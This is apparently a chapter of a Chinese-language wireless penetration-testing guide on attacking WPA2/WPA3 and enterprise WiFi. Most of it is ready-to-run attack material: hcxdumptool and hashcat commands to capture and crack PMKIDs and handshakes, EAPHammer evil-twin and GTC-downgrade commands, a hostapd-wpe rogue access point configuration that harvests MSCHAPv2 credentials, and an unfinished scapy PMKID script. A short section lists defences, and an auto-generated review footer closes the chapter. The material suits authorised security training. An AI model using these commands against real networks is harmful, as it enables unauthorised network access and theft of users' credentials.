# WPA3/Enterprise高级攻击工具

### 3.1 hcxdumptool与hashcat高级用法

#### 3.1.1 hcxdumptool深度解析

hcxdumptool是新一代WiFi握手包捕获工具，相比传统的aircrack-ng有以下优势：

- 主动发送探测帧，加速握手包获取
- 支持PMKID直接提取（无需完整握手）
- 支持WPA3-SAE握手捕获
- 效率更高，自动处理信道切换
- 生成hashcat直接可用的格式

#### 3.1.2 hcxdumptool核心原理

**PMKID攻击模式**：
- 向AP发送关联请求帧
- AP在关联响应的RSNE中包含PMKID
- PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
- 提取PMKID后可直接用于离线破解
- 无需客户端，无需完整握手

**完整握手捕获**：
- 发送取消认证帧迫使客户端重连
- 捕获四次握手的全部或部分消息
- 支持多种EAPOL消息组合

#### 3.1.3 hcxdumptool实战

```bash
# 基本扫描和捕获
hcxdumptool -i wlan0 -o output.pcapng --enable_status=31

# 只捕获PMKID（最快速）
hcxdumptool -i wlan0 -o pmkid_output.pcapng --enable_status=31 --filtermode=2 --filterlist_ap=target_ap_list.txt

# 针对特定SSID
hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1 --ssid="TargetWiFi"

# 启用SAE/WPA3捕获
hcxdumptool -i wlan0 -o wpa3_capture.pcapng --enable_status=31 --enable_sae=1
```

**状态码说明**（--enable_status）：
- 1 = 显示AP信息
- 2 = 显示客户端信息
- 4 = 显示EAPOL信息
- 8 = 显示PROBE信息
- 16 = 显示运行时统计

#### 3.1.4 hashcat高级用法

**WPA/WPA2哈希格式**：
```
WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***
WPA*02*MIC*MAC_AP*MAC_STA*ESSID*EAPOL_MESSAGE1*EAPOL_MESSAGE2***
```

**常见攻击模式**：
```bash
# 字典攻击
hashcat -m 22000 hash.hc22000 wordlist.txt

# 字典+规则攻击
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# 掩码攻击（8位数字密码）
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 组合攻击
hashcat -m 22000 hash.hc22000 -a 1 left.txt right.txt
```

**性能优化**：
```bash
# 使用GPU加速
hashcat -m 22000 hash.hc22000 wordlist.txt -D 2

# 调整工作负载
hashcat -m 22000 hash.hc22000 wordlist.txt -w 4

# 多哈希并行（多个目标）
hashcat -m 22000 multiple_hashes.hc22000 wordlist.txt
```

#### 3.1.5 hcxtools工具集

```bash
# 转换pcapng为hashcat格式
hcxpcapngtool output.pcapng -o hash.hc22000

# 提取PMKID
hcxpcapngtool output.pcapng --pmkid=pmkid.txt

# 提取EAPOL握手
hcxpcapngtool output.pcapng --eapol=eapol.txt

# 转换为John格式
hcxpcapngtool output.pcapng --john=john.txt

# 显示捕获统计
hcxpcapngtool output.pcapng --csv=report.csv
```

---

### 3.2 EAPHammer工具使用

#### 3.2.1 EAPHammer简介

EAPHammer是一个专门针对Enterprise WiFi的综合攻击工具，由Gabriel Ryan开发。它集成了多种攻击模式：

- Evil Twin AP（支持多种EAP方法）
- 证书欺骗
- GTC降级攻击
- 凭证捕获
- 自动TLS证书生成

#### 3.2.2 EAPHammer安装与配置

```bash
# 克隆仓库
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer

# 运行安装脚本
./kali-setup

# 生成证书
./eaphammer --cert-wizard
```

#### 3.2.3 EAPHammer实战

**基础Evil Twin攻击**：
```bash
./eaphammer -i wlan0 \
    --channel 6 \
    --essid CorporateWiFi \
    --auth wpa-eap \
    --creds
```

**GTC降级攻击**：
```bash
./eaphammer -i wlan0 \
    --channel 6 \
    --essid CorporateWiFi \
    --auth wpa-eap \
    --creds \
    --gtc-downgrade
```

**自动证书生成**：
```bash
./eaphammer --cert-wizard
# 按提示输入组织信息
# 生成的证书用于TLS隧道
```

**捕获的凭证位置**：
- 日志目录：`eaphammer/logs/`
- 凭证文件：`eaphammer/creds/`

#### 3.2.4 EAPHammer高级功能

**Hostile Portal模式**：
- 结合Captive Portal攻击
- 强制用户通过Web页面认证
- 窃取明文凭证

**Captive Portal + Enterprise组合攻击**：
- 先创建开放网络的Captive Portal
- 用户输入企业凭证后，再用这些凭证连接Enterprise网络

---

### 3.3 WPA2/WPA3握手包高级处理

#### 3.3.1 握手包质量评估

**完整的四次握手需要捕获**：
- M1：AP -> STA（ANonce, RSN信息）
- M2：STA -> AP（SNonce, MIC）
- M3：AP -> STA（GTK, MIC）
- M4：STA -> AP（确认MIC）

**可用于破解的最小组合**：
- M1 + M2：最常见，足以计算PTK并验证MIC
- M2 + M3：也可以
- PMKID：无需握手消息

#### 3.3.2 握手包清洗与验证

```bash
# 使用wpaclean清洗握手包
wpaclean clean_output.pcap input.pcap

# 使用aircrack-ng验证
aircrack-ng -w wordlist.txt capture-01.cap

# 使用hcxpcapngtool分析
hcxpcapngtool capture.pcapng --check
```

#### 3.3.3 部分握手包利用

**只有M1 + M2的情况**：
- 可以破解WPA-PSK
- 但无法验证GTK完整性

**只有PMKID的情况**：
- 最精简的破解素材
- 来自AP的关联响应帧
- 无需客户端在线

#### 3.3.4 WPA3-SAE握手包处理

SAE握手包的结构与WPA2完全不同：
- Commit消息替代M1/M2
- Confirm消息替代M3/M4
- 目前离线破解WPA3-SAE非常困难
- 主要价值在于分析和侧信道攻击研究

---

### 3.4 PMKID攻击深入

#### 3.4.1 PMKID原理详解

PMKID（Pairwise Master Key Identifier）是AP在关联响应帧中发送的一个值，用于快速漫游时标识PMK。

**PMKID计算公式**：
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
```

其中：
- `PMK`：Pairwise Master Key（由密码派生）
- `"PMK Name"`：固定字符串
- `BSSID`：AP的MAC地址
- `STA_MAC`：客户端的MAC地址

**为什么可以破解**：
- PMKID是已知值（从帧中提取）
- BSSID和STA_MAC是已知值
- "PMK Name"是固定字符串
- 只有PMK是未知的，而PMK由密码、SSID派生
- 因此可以通过猜测密码来计算PMKID并验证

#### 3.4.2 PMKID攻击的优势

1. **无需客户端**：只需AP在线即可
2. **速度快**：发送一个关联请求即可获取
3. **无需取消认证**：不会干扰正常用户
4. **数据量小**：只需一个帧
5. **成功率高**：只要AP支持RSN，通常就有PMKID

#### 3.4.3 PMKID攻击的限制

1. 仅适用于WPA2/WPA3的RSN网络
2. 某些AP可能不发送PMKID
3. 对于Enterprise网络，PMK由认证服务器生成，PMKID不能直接用于破解密码
4. 无法区分是否启用了MFP

#### 3.4.4 实战：PMKID攻击脚本

```python
# Python示例：手动构造PMKID攻击
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11AssoReq, Dot11Elt, RadioTap

def pmkid_attack(interface, target_bssid, ssid):
    # 构造关联请求帧
    dot11 = Dot11(
        type=0, subtype=0,  # 管理帧, 关联请求
        addr1=target_bssid,
        addr2="00:11:22:33:44:55",  # 伪造的客户端MAC
        addr3=target_bssid
    )
    
    # SSID元素
    ssid_elt = Dot11Elt(ID='SSID', info=ssid)
    
    # RSN元素（声明支持RSN）
    rsn_elt = Dot11Elt(
        ID='RSNinfo',
        info=b'\x01\x00'  # RSN版本1
             b'\x00\x0f\xac\x02'  # TKIP/CCMP等
             b'\x02\x00'  # 2个密码套件
             b'\x00\x0f\xac\x04'  # CCMP
             b'\x00\x0f\xac\x02'  # TKIP
             b'\x01\x00'  # 1个AKM套件
             b'\x00\x0f\xac\x02'  # PSK
             b'\xcc\x00'  # RSN能力
    )
    
    # 发送关联请求
    packet = RadioTap() / dot11 / Dot11AssoReq() / ssid_elt / rsn_elt
    
    # 发送并监听响应
    response = srp1(packet, iface=interface, timeout=2, verbose=0)
    
    if response and response.haslayer(Dot11AssoResp):
        # 检查是否包含RSN元素和PMKID
        # 提取PMKID...
        pass
```

#### 3.4.5 防御PMKID攻击

- 禁用PMKID（但可能影响漫游性能）
- 使用强密码（增加破解难度）
- 使用Enterprise认证（PMK不是从密码派生）
- 部署WIPS检测异常关联请求

---

### 3.5 hostapd-wpe配置与使用

#### 3.5.1 hostapd-wpe简介

hostapd-wpe（Wireless Pentesters Edition）是hostapd的修改版，专门用于无线渗透测试：

- 支持多种EAP方法的凭证捕获
- 自动生成自签名证书
- 支持GTC降级攻击
- 可定制EAP用户配置

#### 3.5.2 hostapd-wpe配置详解

**主配置文件**：
```
# /etc/hostapd-wpe/hostapd-wpe.conf

interface=wlan0
driver=nl80211
ssid=CorporateNet
hw_mode=g
channel=36
ieee8021x=1
eap_server=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# WPE特定配置
wpe_logfile=/tmp/hostapd-wpe.log
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
```

**EAP用户文件**：
```
# /etc/hostapd-wpe/hostapd.eap_user

# 允许所有用户，使用任何EAP方法
*     PEAP,TTLS,TLS,FAST,MD5,GTC
"*"   TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  "password"  [2]
```

#### 3.5.3 hostapd-wpe实战

```bash
# 启动hostapd-wpe
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 查看捕获的凭证
cat /tmp/hostapd-wpe.log
```

**输出示例**：
```
mschapv2: username: jsmith
          challenge: 5e:b2:9a:8c:1d:3f:07:2a
          response: 88:4a:3d:9e:7f:2c:1b:6a:5d:4e:3f:2a:1b:0c:9d:8e:7f:6a:5b:4c:3d:2e:1f:00
          jtr NETNTLM: jsmith:$NETNTLM$5eb29a8c1d3f072a$884a3d9e7f2c1b6a5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f00
```

#### 3.5.4 证书自定义

```bash
# 重新生成证书
cd /etc/hostapd-wpe/certs
./bootstrap

# 使用自定义证书
# 替换 ca.pem, server.pem, server.key
```

#### 3.5.5 高级技巧：Mixed Mode AP

配置同时支持WPA2和WPA3的混合模式AP，用于降级攻击研究：
```
# 添加WPA3支持
wpa_key_mgmt=WPA-EAP WPA-EAP-SHA256 SAE
sae_password=testpassword
ieee80211w=2  # MFP required
```

---

---

## 📋 内容审核与补充建议

> 针对「WPA3/Enterprise高级攻击工具」部分的内容审核结果：

### ⌨️ 命令帮助
- ⚠️ 缺少commands相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
